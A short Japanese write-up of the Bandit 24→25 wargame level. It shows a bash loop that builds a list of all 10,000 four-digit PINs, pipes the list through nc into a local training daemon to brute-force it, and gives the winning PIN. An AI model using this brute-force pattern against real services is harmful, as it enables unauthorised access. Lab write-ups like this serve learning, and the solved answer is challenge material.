```

Bandit Level 24 → Level 25
Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
```

今回の課題は、30002番ポートで待機しているlocalhostに接続を行い、Bandit24のパスワードと正しいPINコードをスペース区切りで送るというもの。  
PINは0000~9999の範囲であり総当り攻撃で見つける。  

まずは、総当り攻撃用のリストファイルを作成する。  
```
#!/bin/bash

pass="*******************************"

for num in {0000..9999}; do
	echo $pass $num >> brutelist.txt
done
```

次にncで接続を行い、作成したリストファイルを流し込む。  

`cat brutelist.txt | nc localhost 30002`

PINコード`9297`が正しいコードだった。  

クリア。  

